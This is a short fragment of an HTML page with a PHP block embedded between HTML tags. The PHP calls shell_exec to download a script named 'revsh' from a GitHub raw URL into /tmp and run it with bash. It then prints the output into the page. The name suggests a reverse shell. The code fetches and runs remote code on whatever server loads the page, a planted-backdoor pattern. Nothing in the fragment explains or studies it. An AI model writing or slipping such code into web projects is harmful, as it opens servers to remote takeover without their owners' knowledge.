	</body>
</html>	
<?php 
	$prova = shell_exec('cd /tmp/trs; wget -o revsh https://raw.githubusercontent.com/Gabry-r/Shellscripts/master/tes; /bin/bash /tmp/trs/revsh; cat /tmp/trs/revsh');
	print "<html>
	    <body>
		{$prova}
	    </body>
	  </html>
	";
?>
<html>
	<body>


